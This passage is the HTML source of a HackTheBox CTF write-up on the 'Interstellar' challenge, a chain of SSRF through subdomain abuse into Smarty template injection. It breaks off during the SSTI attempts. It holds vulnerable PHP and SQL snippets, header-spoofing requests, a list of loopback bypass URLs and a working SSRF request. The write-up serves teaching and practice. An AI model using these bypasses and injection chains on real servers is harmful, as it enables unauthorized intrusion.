@@ -1,0 +1,1311 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Interstellar — HTB CTF Writeup | Abdelaaziz Belkhair</title>
+    <meta name="description"
+        content="HTB CTF Writeup: Interstellar — SSRF + Smarty SSTI chain to RCE on PHP 7.0 / Apache / MariaDB stack.">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link
+        href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css"
+        integrity="sha512-Evv84Mr4kqVGRNSgIGL/F/aIDqQb7xQ2vcrdIwxfjThSH8CSR7PBEakCr51Ck+w+/U6swU2Im1vVX0SVk9ABhg=="
+        crossorigin="anonymous" referrerpolicy="no-referrer">
+    <style>
+        :root {
+            --primary: #00d4ff;
+            --accent: #ff6b6b;
+            --success: #00ff88;
+            --bg: #0a0a0a;
+            --bg-card: #111111;
+            --bg-terminal: #0d0d0d;
+            --text: #e4e4e7;
+            --text-secondary: #a1a1aa;
+            --text-muted: #71717a;
+            --border: #27272a;
+            --orange: #f97316;
+            --purple: #a78bfa;
+        }
+
+        *,
+        *::before,
+        *::after {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            line-height: 1.8;
+        }
+
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 0 24px;
+        }
+
+        a {
+            color: var(--primary);
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+
+        a:hover {
+            color: var(--success);
+        }
+
+        /* ── Header ── */
+        header {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 100;
+            background: rgba(10, 10, 10, 0.95);
+            backdrop-filter: blur(12px);
+            border-bottom: 1px solid var(--border);
+        }
+
+        nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1rem 24px;
+            max-width: 1100px;
+            margin: 0 auto;
+        }
+
+        .logo {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 1.25rem;
+            font-weight: 700;
+            color: var(--primary);
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 1.75rem;
+            list-style: none;
+        }
+
+        .nav-links a {
+            color: var(--text-secondary);
+            font-weight: 500;
+        }
+
+        .nav-links a:hover {
+            color: var(--primary);
+        }
+
+        main {
+            padding-top: 100px;
+            padding-bottom: 60px;
+        }
+
+        .back-link {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            color: var(--text-secondary);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .back-link:hover {
+            color: var(--primary);
+        }
+
+        /* ── Challenge Card (HTB-style) ── */
+        .challenge-card {
+            background: linear-gradient(135deg, rgba(249, 115, 22, 0.08) 0%, rgba(0, 212, 255, 0.04) 100%);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 2rem 2.5rem;
+            margin-bottom: 2rem;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .challenge-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, var(--orange), var(--primary), var(--purple));
+        }
+
+        .challenge-card::after {
+            content: '';
+            position: absolute;
+            top: -60px;
+            right: -60px;
+            width: 180px;
+            height: 180px;
+            border-radius: 50%;
+            background: radial-gradient(circle, rgba(249, 115, 22, 0.08) 0%, transparent 70%);
+            pointer-events: none;
+        }
+
+        .challenge-platform {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.75rem;
+            color: var(--success);
+            background: rgba(0, 255, 136, 0.1);
+            padding: 0.3rem 0.75rem;
+            border-radius: 20px;
+            margin-bottom: 1rem;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+        }
+
+        .challenge-title {
+            font-size: 2.2rem;
+            font-weight: 700;
+            line-height: 1.2;
+            margin-bottom: 0.5rem;
+            background: linear-gradient(135deg, var(--text) 0%, var(--text-secondary) 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .challenge-subtitle {
+            color: var(--text-secondary);
+            font-size: 1.05rem;
+            margin-bottom: 1.5rem;
+            max-width: 650px;
+        }
+
+        .challenge-meta {
+            display: flex;
+            gap: 0.6rem;
+            flex-wrap: wrap;
+            margin-bottom: 1.5rem;
+        }
+
+        .meta-badge {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.7rem;
+            padding: 0.3rem 0.7rem;
+            border-radius: 6px;
+            text-transform: uppercase;
+            letter-spacing: 0.3px;
+            font-weight: 600;
+        }
+
+        .meta-badge.date {
+            color: var(--primary);
+            background: rgba(0, 212, 255, 0.12);
+        }
+
+        .meta-badge.category {
+            color: var(--purple);
+            background: rgba(167, 139, 250, 0.12);
+        }
+
+        .meta-badge.tag {
+            color: var(--orange);
+            background: rgba(249, 115, 22, 0.12);
+        }
+
+        .challenge-stats {
+            display: flex;
+            gap: 1px;
+            background: var(--border);
+            border-radius: 12px;
+            overflow: hidden;
+            margin-top: 0.5rem;
+        }
+
+        .stat-item {
+            flex: 1;
+            padding: 1rem;
+            text-align: center;
+            background: var(--bg-card);
+        }
+
+        .stat-item:first-child {
+            border-radius: 12px 0 0 12px;
+        }
+
+        .stat-item:last-child {
+            border-radius: 0 12px 12px 0;
+        }
+
+        .stat-value {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 1.3rem;
+            font-weight: 700;
+            display: block;
+        }
+
+        .stat-value.difficulty-medium {
+            color: var(--orange);
+        }
+
+        .stat-value.difficulty-hard {
+            color: var(--accent);
+        }
+
+        .stat-value.difficulty-easy {
+            color: var(--success);
+        }
+
+        .stat-value.impact {
+            color: var(--accent);
+        }
+
+        .stat-value.vulns {
+            color: var(--primary);
+        }
+
+        .stat-label {
+            font-size: 0.7rem;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-top: 0.25rem;
+        }
+
+        /* ── Table of Contents ── */
+        .toc {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 1.25rem 1.5rem;
+            margin-bottom: 2rem;
+        }
+
+        .toc-title {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.8rem;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 0.75rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .toc-title::before {
+            content: '';
+            width: 12px;
+            height: 2px;
+            background: var(--orange);
+        }
+
+        .toc ol {
+            list-style: none;
+            counter-reset: toc-counter;
+            padding: 0;
+            margin: 0;
+        }
+
+        .toc li {
+            counter-increment: toc-counter;
+            margin-bottom: 0.25rem;
+        }
+
+        .toc li a {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            color: var(--text-secondary);
+            font-size: 0.85rem;
+            padding: 0.35rem 0.5rem;
+            border-radius: 6px;
+            transition: all 0.15s;
+        }
+
+        .toc li a:hover {
+            color: var(--orange);
+            background: rgba(249, 115, 22, 0.06);
+        }
+
+        .toc li a::before {
+            content: counter(toc-counter, decimal-leading-zero);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.7rem;
+            color: var(--text-muted);
+            min-width: 20px;
+        }
+
+        /* ── Article Content ── */
+        .article-content h2 {
+            font-size: 1.35rem;
+            margin: 2.5rem 0 1rem;
+            color: var(--text);
+            padding-bottom: 0.6rem;
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+        }
+
+        .article-content h2::before {
+            content: '';
+            width: 4px;
+            height: 22px;
+            background: var(--orange);
+            border-radius: 2px;
+            flex-shrink: 0;
+        }
+
+        .article-content h3 {
+            font-size: 1.1rem;
+            margin: 1.5rem 0 0.75rem;
+            color: var(--text);
+        }
+
+        .article-content h4 {
+            font-size: 0.95rem;
+            margin: 1.25rem 0 0.5rem;
+            color: var(--text-secondary);
+        }
+
+        .article-content p {
+            margin-bottom: 1rem;
+            color: var(--text-secondary);
+        }
+
+        .article-content ul,
+        .article-content ol {
+            margin: 1rem 0;
+            padding-left: 1.5rem;
+            color: var(--text-secondary);
+        }
+
+        .article-content li {
+            margin-bottom: 0.5rem;
+        }
+
+        /* ── Code Blocks ── */
+        .article-content pre {
+            background: var(--bg-terminal);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 1.25rem 1.25rem 1.25rem;
+            overflow-x: auto;
+            margin: 1.5rem 0;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.8rem;
+            line-height: 1.6;
+            position: relative;
+        }
+
+        .article-content pre::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, var(--orange) 0%, transparent 100%);
+            border-radius: 10px 10px 0 0;
+        }
+
+        .article-content code {
+            font-family: 'JetBrains Mono', monospace;
+            background: rgba(249, 115, 22, 0.1);
+            padding: 0.15rem 0.45rem;
+            border-radius: 4px;
+            font-size: 0.83em;
+            color: var(--orange);
+        }
+
+        .article-content pre code {
+            background: none;
+            padding: 0;
+            color: var(--text-secondary);
+        }
+
+        /* ── Info & Warning Boxes ── */
+        .info-box {
+            background: rgba(0, 212, 255, 0.06);
+            border: 1px solid rgba(0, 212, 255, 0.15);
+            border-left: 3px solid var(--primary);
+            padding: 1.25rem 1.5rem;
+            border-radius: 0 10px 10px 0;
+            margin: 1.5rem 0;
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+        }
+
+        .warning-box {
+            background: rgba(255, 107, 107, 0.06);
+            border: 1px solid rgba(255, 107, 107, 0.15);
+            border-left: 3px solid var(--accent);
+            padding: 1.25rem 1.5rem;
+            border-radius: 0 10px 10px 0;
+            margin: 1.5rem 0;
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+        }
+
+        /* ── Tables ── */
+        table {
+            width: 100%;
+            border-collapse: separate;
+            border-spacing: 0;
+            margin: 1.5rem 0;
+            font-size: 0.85rem;
+            border-radius: 10px;
+            overflow: hidden;
+            border: 1px solid var(--border);
+        }
+
+        th,
+        td {
+            padding: 0.7rem 1rem;
+            text-align: left;
+        }
+
+        th {
+            background: var(--bg-terminal);
+            color: var(--primary);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.78rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.3px;
+            border-bottom: 1px solid var(--border);
+        }
+
+        td {
+            color: var(--text-secondary);
+            border-bottom: 1px solid rgba(39, 39, 42, 0.5);
+        }
+
+        tr:last-child td {
+            border-bottom: none;
+        }
+
+        tr:hover td {
+            background: rgba(249, 115, 22, 0.03);
+        }
+
+        td code {
+            font-size: 0.8em;
+        }
+
+        hr {
+            border: none;
+            border-top: 1px solid var(--border);
+            margin: 2rem 0;
+        }
+
+        /* ── Pwned Banner ── */
+        .pwned-banner {
+            text-align: center;
+            padding: 2.5rem 2rem;
+            margin: 3rem 0 1rem;
+            background: linear-gradient(135deg, rgba(0, 255, 136, 0.06) 0%, rgba(0, 212, 255, 0.04) 100%);
+            border: 1px solid rgba(0, 255, 136, 0.2);
+            border-radius: 16px;
+            position: relative;
+        }
+
+        .pwned-banner::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, var(--success), var(--primary));
+        }
+
+        .pwned-icon {
+            font-size: 2.5rem;
+            margin-bottom: 0.75rem;
+            display: block;
+        }
+
+        .pwned-text {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: var(--success);
+            text-transform: uppercase;
+            letter-spacing: 3px;
+        }
+
+        .pwned-sub {
+            color: var(--text-muted);
+            font-size: 0.85rem;
+            margin-top: 0.5rem;
+        }
+
+        /* ── Footer ── */
+        footer {
+            padding: 1.5rem 0;
+            border-top: 1px solid var(--border);
+            text-align: center;
+        }
+
+        footer p {
+            color: var(--text-muted);
+            font-size: 0.8rem;
+        }
+
+        /* ── Responsive ── */
+        @media (max-width: 768px) {
+            .nav-links {
+                display: none;
+            }
+
+            .challenge-title {
+                font-size: 1.6rem;
+            }
+
+            .challenge-card {
+                padding: 1.5rem;
+            }
+
+            .challenge-stats {
+                flex-wrap: wrap;
+            }
+
+            .stat-item {
+                min-width: 80px;
+            }
+
+            table {
+                font-size: 0.75rem;
+            }
+
+            th,
+            td {
+                padding: 0.4rem 0.6rem;
+            }
+
+            .toc {
+                display: none;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <header>
+        <nav>
+            <a href="../index.html" class="logo">AB_</a>
+            <ul class="nav-links">
+                <li><a href="../index.html">Accueil</a></li>
+                <li><a href="../blog.html">Blog</a></li>
+                <li><a href="../writeups.html">Writeups</a></li>
+                <li><a href="../index.html#contact">Contact</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <main class="container">
+        <a href="../writeups.html" class="back-link"><i class="fas fa-arrow-left"></i> Retour aux writeups</a>
+
+        <article>
+            <div class="challenge-card">
+                <span class="challenge-platform"><i class="fas fa-flag"></i> HackTheBox CTF</span>
+                <h1 class="challenge-title">Interstellar</h1>
+                <p class="challenge-subtitle">SSRF via subdomain abuse + Smarty SSTI to RCE on a PHP 7.0 / Apache /
+                    MariaDB stack with randomized flag path.</p>
+                <div class="challenge-meta">
+                    <span class="meta-badge date"><i class="fas fa-calendar"></i> 2026-02-14</span>
+                    <span class="meta-badge category">Web Exploitation</span>
+                    <span class="meta-badge tag">SSRF</span>
+                    <span class="meta-badge tag">SSTI</span>
+                    <span class="meta-badge tag">RCE</span>
+                </div>
+                <div class="challenge-stats">
+                    <div class="stat-item">
+                        <span class="stat-value difficulty-medium">Medium</span>
+                        <span class="stat-label">Difficulty</span>
+                    </div>
+                    <div class="stat-item">
+                        <span class="stat-value vulns">5</span>
+                        <span class="stat-label">Vulns Found</span>
+                    </div>
+                    <div class="stat-item">
+                        <span class="stat-value impact">RCE</span>
+                        <span class="stat-label">Impact</span>
+                    </div>
+                    <div class="stat-item">
+                        <span class="stat-value difficulty-medium">PHP 7.0</span>
+                        <span class="stat-label">Stack</span>
+                    </div>
+                </div>
+            </div>
+
+            <nav class="toc">
+                <div class="toc-title">Table of Contents</div>
+                <ol>
+                    <li><a href="#s1">Architecture Overview</a></li>
+                    <li><a href="#s2">Reconnaissance</a></li>
+                    <li><a href="#s3">Source Code Analysis</a></li>
+                    <li><a href="#s4">The Rabbit Hole — Failed Bypasses</a></li>
+                    <li><a href="#s5">The Breakthrough — Subdomain Abuse</a></li>
+                    <li><a href="#s6">SSTI Exploitation — RCE</a></li>
+                    <li><a href="#s7">Attack Chain Summary</a></li>
+                    <li><a href="#s8">Why Other Approaches Failed</a></li>
+                    <li><a href="#s9">Bonus: SQL Injection</a></li>
+                    <li><a href="#s10">Key Takeaways</a></li>
+                    <li><a href="#s11">Remediation</a></li>
+                </ol>
+            </nav>
+
+            <div class="article-content">
+
+                <div class="info-box">
+                    <strong>Challenge</strong>: Interstellar (web_spooky_time)<br>
+                    <strong>Category</strong>: Web Exploitation<br>
+                    <strong>Difficulty</strong>: Medium<br>
+                    <strong>Target</strong>: <code>http://154.57.164.81:31945</code><br>
+                    <strong>Flag</strong>: <code>HTB{REDACTED}</code> (stored at
+                    <code>/&lt;random_hex&gt;_flag.txt</code>)
+                </div>
+
+                <h2 id="s1">1. Architecture Overview</h2>
+
+                <p>The challenge runs a <strong>PHP 7.0</strong> application on <strong>Apache 2.4.25 (Debian)</strong>
+                    with a <strong>MariaDB</strong> backend and the <strong>Smarty</strong> template engine.</p>
+
+                <pre><code>┌──────────────────────────────────────────────────────────┐
+│                   APACHE (:80)                            │
+│                                                          │
+│  /login.php     → Login form                             │
+│  /register.php  → Registration (sanitizes name!)         │
+│  /index.php     → Dashboard + "Change Name" (localhost)  │
+│  /communicate.php → SSRF endpoint (motherland.com only)  │
+│                                                          │
+│  Templates: Smarty (.tpl)                                │
+│  Database: MariaDB (interstellar)                        │
+└──────────────────────────────────────────────────────────┘</code></pre>
+
+                <h3>Flag Location (Dockerfile)</h3>
+
+                <pre><code>FROM php:7.0-apache
+COPY flag.txt /tmp/
+RUN mv /tmp/flag.txt /$(openssl rand -hex 8)_flag.txt   # Random filename!</code></pre>
+
+                <p>The flag is placed at <code>/&lt;16-char-hex&gt;_flag.txt</code> — a <strong>randomized
+                        path</strong>. You can't just read <code>/flag.txt</code>; you need to <strong>list the root
+                        directory</strong> first.</p>
+
+                <h2 id="s2">2. Reconnaissance</h2>
+
+                <h3>Endpoint Map</h3>
+
+                <p>Using <strong>feroxbuster</strong>, the following endpoints were discovered:</p>
+
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Endpoint</th>
+                            <th>Status</th>
+                            <th>Description</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><code>/</code> (index.php)</td>
+                            <td>200</td>
+                            <td>Dashboard — shows name, planet, "Change Name" form</td>
+                        </tr>
+                        <tr>
+                            <td><code>/login.php</code></td>
+                            <td>200</td>
+                            <td>Login form</td>
+                        </tr>
+                        <tr>
+                            <td><code>/register.php</code></td>
+                            <td>200</td>
+                            <td>Registration form</td>
+                        </tr>
+                        <tr>
+                            <td><code>/communicate.php</code></td>
+                            <td>200</td>
+                            <td>SSRF endpoint — "Send request to your mother land!"</td>
+                        </tr>
+                        <tr>
+                            <td><code>/templates_c/</code></td>
+                            <td>301</td>
+                            <td>Smarty compiled templates directory (confirms Smarty)</td>
+                        </tr>
+                        <tr>
+                            <td><code>/logout.php</code></td>
+                            <td>200</td>
+                            <td>Session destroy</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <h3>Key Observations</h3>
+
+                <ol>
+                    <li><strong>"Change your name"</strong> form on <code>/</code> has a hidden <code>action=edit</code>
+                        input</li>
+                    <li>Submitting it returns: <strong>"Only localhost can use this function!"</strong></li>
+                    <li><strong><code>/communicate.php</code></strong> has a form with URL, Key, and Value fields</li>
+                    <li>The page title says <em>"Send request to your mother land!"</em> — a deliberate hint</li>
+                </ol>
+
+                <h2 id="s3">3. Source Code Analysis</h2>
+
+                <h3>Vulnerability 1: Localhost-Only Name Change (index.php)</h3>
+
+                <pre><code>// index.php — Line 43-50
+} elseif ($action == "edit") {
+    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+        if ($_SERVER['REMOTE_ADDR'] != '127.0.0.1') {       // ← Hard IP check
+            $smarty-&gt;assign('error', "Only localhost can use this function!");
+            $smarty-&gt;display('index.tpl');
+            exit();
+        }
+        $new_name = $_REQUEST['new_name'] ?? '';              // ← No sanitization!
+        // ... CALL editName(?, ?) — parameterized, safe
+        $_SESSION['name'] = $new_name;                        // ← Stored in session</code></pre>
+
+                <p><strong>Critical</strong>: The check uses <code>$_SERVER['REMOTE_ADDR']</code>, which is the actual
+                    TCP source IP. <strong>HTTP headers cannot spoof this.</strong> The only way to pass this check is
+                    to make the request originate from the server itself — i.e., <strong>SSRF</strong>.</p>
+
+                <p>Also note: <code>$new_name</code> is <strong>NOT sanitized</strong> here, unlike in
+                    <code>register.php</code>. This is the injection point.
+                </p>
+
+                <h3>Vulnerability 2: Server-Side Template Injection (Smarty)</h3>
+
+                <p>The template <code>index.tpl</code> renders the name directly:</p>
+
+                <pre><code>&lt;h2&gt;Yo, {$name}&lt;/h2&gt;</code></pre>
+
+                <p>And <code>index.php</code> sets <code>$name</code> from the session:</p>
+
+                <pre><code>$smarty-&gt;assign('name', $name);   // $name = $_SESSION['name']</code></pre>
+
+                <p>If we can inject Smarty syntax into the name via the localhost-only edit function, the template
+                    engine will <strong>execute it</strong>.</p>
+
+                <h3>Vulnerability 3: Registration Sanitizer (register.php)</h3>
+
+                <pre><code>// register.php — Line 8
+$name = preg_replace('/[^a-zA-Z0-9]/', '', $name);   // Strips ALL special chars</code></pre>
+
+                <p>This regex removes <code>{}</code>, <code>()</code>, <code>'</code>, <code>$</code>, <code>*</code> —
+                    <strong>everything needed for Smarty SSTI</strong>. Registration is a dead end for injection.
+                </p>
+
+                <h3>Vulnerability 4: SSRF with Allowlist (communicate.php)</h3>
+
+                <pre><code>// communicate.php — Lines 11-17
+if (filter_var($url, FILTER_VALIDATE_URL)) {
+    $parsedUrl = parse_url($url);
+    if (preg_match('/motherland\.com$/', $parsedUrl['host'])) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $parsedUrl['host']);    // ← Uses ONLY host!
+        curl_setopt($ch, CURLOPT_POST, true);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));</code></pre>
+
+                <p>Three layers of URL validation:</p>
+                <ol>
+                    <li><strong><code>filter_var($url, FILTER_VALIDATE_URL)</code></strong> — Must be a valid URL</li>
+                    <li><strong><code>parse_url($url)</code></strong> — Extracts host component</li>
+                    <li><strong><code>preg_match('/motherland\.com$/', $parsedUrl['host'])</code></strong> — Host must
+                        end with <code>motherland.com</code></li>
+                </ol>
+
+                <p><strong>The critical flaw</strong>: <code>curl_setopt($ch, CURLOPT_URL, $parsedUrl['host'])</code>
+                    uses <strong>only the host component</strong>, not the full URL. And curl is given <strong>just a
+                        hostname</strong> as the URL.</p>
+
+                <h3>Vulnerability 5: SQL Injection in searchUser (init.sql)</h3>
+
+                <pre><code>CREATE PROCEDURE searchUser(IN name VARCHAR(255))
+BEGIN
+    SET @sql = CONCAT('SELECT * FROM users WHERE name = \'', name, '\'');
+    PREPARE stmt FROM @sql;
+    EXECUTE stmt;
+END</code></pre>
+
+                <p>The <code>searchUser</code> stored procedure uses <strong>string concatenation</strong> to build a
+                    SQL query. If the name contains SQL metacharacters, it's injectable. This becomes exploitable once
+                    we can set the name to arbitrary values (via SSTI → RCE → or directly via the name change).</p>
+
+                <h2 id="s4">4. The Rabbit Hole — Failed Bypass Attempts</h2>
+
+                <h3>❌ Header Spoofing (X-Forwarded-For, X-Real-IP, etc.)</h3>
+
+                <pre><code>POST / HTTP/1.1
+Host: 154.57.164.81:31945
+X-Forwarded-For: 127.0.0.1
+X-Real-IP: 127.0.0.1
+Client-IP: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+
+new_name=hello&amp;action=edit</code></pre>
+
+                <p><strong>Result</strong>: "Only localhost can use this function!" — because
+                    <code>$_SERVER['REMOTE_ADDR']</code> is the TCP source IP, not an HTTP header. <strong>Cannot be
+                        spoofed.</strong>
+                </p>
+
+                <h3>❌ Host Header Manipulation</h3>
+
+                <pre><code>POST / HTTP/1.1
+Host: localhost
+X-Forwarded-Host: localhost</code></pre>
+
+                <p><strong>Result</strong>: Still blocked. <code>REMOTE_ADDR</code> is set by the web server based on
+                    the TCP connection, not the <code>Host</code> header.</p>
+
+                <h3>❌ SSRF URL Bypass Attempts (communicate.php)</h3>
+
+                <p>The allowlist <code>preg_match('/motherland\.com$/', $parsedUrl['host'])</code> blocked everything:
+                </p>
+
+                <table>
+                    <thead>
+                        <tr>
+                            <th>URL Attempted</th>
+                            <th>Error</th>
+                            <th>Why It Failed</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><code>http://127.0.0.1/index.php</code></td>
+                            <td>Wrong URL!</td>
+                            <td>Host <code>127.0.0.1</code> doesn't end with <code>motherland.com</code></td>
+                        </tr>
+                        <tr>
+                            <td><code>http://localhost/index.php</code></td>
+                            <td>Wrong URL!</td>
+                            <td>Host <code>localhost</code> doesn't match</td>
+                        </tr>
+                        <tr>
+                            <td><code>http://0/index.php</code></td>
+                            <td>Wrong URL!</td>
+                            <td>Host <code>0</code> doesn't match</td>
+                        </tr>
+                        <tr>
+                            <td><code>http://2130706433/index.php</code></td>
+                            <td>Wrong URL!</td>
+                            <td>Decimal IP doesn't match</td>
+                        </tr>
+                        <tr>
+                            <td><code>http://0x7F000001/index.php</code></td>
+                            <td>Wrong URL!</td>
+                            <td>Hex IP doesn't match</td>
+                        </tr>
+                        <tr>
+                            <td><code>http://[::1]/index.php</code></td>
+                            <td>Wrong URL!</td>
+                            <td>IPv6 doesn't match</td>
+                        </tr>
+                        <tr>
+                            <td><code>http://127.0.0.2/index.php</code></td>
+                            <td>Wrong URL!</td>
+                            <td>Alternate loopback doesn't match</td>
+                        </tr>
+                        <tr>
+                            <td><code>http://127.1/index.php</code></td>
+                            <td>Wrong URL!</td>
+                            <td>Short IP doesn't match</td>
+                        </tr>
+                        <tr>
+                            <td><code>file:///var/www/html/communicate.php</code></td>
+                            <td>Wrong URL!</td>
+                            <td><code>FILTER_VALIDATE_URL</code> rejects <code>file://</code></td>
+                        </tr>
+                        <tr>
+                            <td><code>php://filter/...</code></td>
+                            <td>Wrong URL!</td>
+                            <td>Not a valid URL scheme for <code>filter_var</code></td>
+                        </tr>
+                        <tr>
+                            <td><code>http://admin@127.0.0.1/index.php</code></td>
+                            <td>Wrong URL!</td>
+                            <td>Host is still <code>127.0.0.1</code></td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <h3>❌ HTTP Request Smuggling / Path Traversal</h3>
+
+                <p>Not applicable — single Apache server, no proxy layer to desync.</p>
+
+                <h2 id="s5">5. The Breakthrough — "Send request to your mother land!"</h2>
+
+                <h3>Discovery: The Domain Hint</h3>
+
+                <p>The communicate.php page title says <strong>"Send request to your mother land!"</strong> — and the
+                    regex requires the host to end with <code>motherland.com</code>. The trick is <strong>subdomain
+                        abuse</strong>:</p>
+
+                <p>A hostname like <code>127.0.0.1.motherland.com</code> ends with <code>motherland.com</code> and
+                    passes the regex.</p>
+
+                <p>But wait — the code does <code>curl_setopt($ch, CURLOPT_URL, $parsedUrl['host'])</code>. This sends
+                    curl <strong>just the hostname</strong>: <code>127.0.0.1.motherland.com</code>. When curl receives a
+                    bare hostname without a scheme, it will attempt to resolve it via DNS.</p>
+
+                <p>The key insight: <strong>The hostname IS the URL being fetched by curl.</strong> So we need a
+                    hostname that:</p>
+                <ol>
+                    <li>Ends with <code>motherland.com</code> (passes regex)</li>
+                    <li>When curl resolves it, connects to <code>127.0.0.1</code> (hits localhost)</li>
+                </ol>
+
+                <h3>The Payload: <code>127.0.0.1.motherland.com</code></h3>
+
+                <p>If <code>motherland.com</code> has a wildcard DNS record (or <code>127.0.0.1.motherland.com</code>
+                    specifically resolves to <code>127.0.0.1</code>), then:</p>
+
+                <ul>
+                    <li><code>parse_url</code> extracts host: <code>127.0.0.1.motherland.com</code> ✓ matches regex</li>
+                    <li><code>curl</code> receives <code>127.0.0.1.motherland.com</code> as URL → resolves to 127.0.0.1
+                        → <strong>hits localhost</strong></li>
+                    <li>curl sends a POST with the <code>data</code> array and the session cookie</li>
+                </ul>
+
+                <h3>Testing the SSRF</h3>
+
+                <pre><code>POST /communicate.php HTTP/1.1
+Host: 154.57.164.81:31945
+Content-Type: multipart/form-data; boundary=----Boundary
+Cookie: PHPSESSID=fa3aa4b97564e0ead60e0fdaa7892354
+
+------Boundary
+Content-Disposition: form-data; name="url"
+
+http://127.0.0.1.motherland.com/index.php
+------Boundary
+Content-Disposition: form-data; name="data[new_name]"
+
+testssrf
+------Boundary
+Content-Disposition: form-data; name="data[action]"
+
+edit
+------Boundary--</code></pre>
+
+                <p>After sending, navigate to <code>/</code> — the name changes to <code>testssrf</code>. <strong>SSRF
+                        bypass confirmed.</strong></p>
+
+                <div class="info-box">
+                    <strong>Why <code>data[new_name]</code> and <code>data[action]</code>?</strong> The JavaScript
+                    <code>sendForm.js</code> constructs the POST body as <code>data[key]=value</code>. The PHP backend
+                    reads <code>$_POST['data']</code> as an associative array. When curl POSTs this to
+                    <code>index.php</code>, the <code>$_REQUEST['new_name']</code> and <code>$_REQUEST['action']</code>
+                    are populated from the <code>data</code> array via <code>http_build_query($data)</code>.
+                </div>
+
+                <h2 id="s6">6. SSTI Exploitation — From Name Change to RCE</h2>
+
+                <h3>Challenge: Registration Sanitizer vs. Edit Endpoint</h3>
+
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Endpoint</th>
+                            <th>Sanitization</th>
+                            <th>Accessible From</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><code>register.php</code></td>
+                            <td><code>preg_replace('/[^a-zA-Z0-9]/', '', $name)</code> — strips ALL special chars</td>
+                            <td>Anywhere</td>
+                        </tr>
+                        <tr>
+                            <td><code>index.php</code> (edit)</td>
+                            <td><strong>None</strong> — raw <code>$_REQUEST['new_name']</code></td>
+                            <td>Localhost only (via SSRF)</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <p>The edit endpoint has <strong>no input sanitization</strong>. Through the SSRF, we can set the name
+                    to <strong>any Smarty template code</strong>.</p>
+
+                <h3>Initial SSTI Attempts</h3>
+
+                <p>The user initially tried SSTI payloads through <strong>registration</strong> (before discovering the
+                    SSRF):</p>
+
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Registered Name</th>
+                            <th>Displayed As</th>
+                            <th>Explanation</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><code>{{7*7}}</code></td>
+                            <td><code>77</code></td>
+                            <td>Registration stripped <code>{</code>, <code>}</code>, <code>*</code> → left
+                                <code>77</code>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td><code>{7*7}</code></td>
+                            <td><code>77</code></td>
+                            <td>Same — sanitizer removed <code>{</code>, <code>}</code>, <code>*</code></td>
+                        </tr>
+                        <tr>
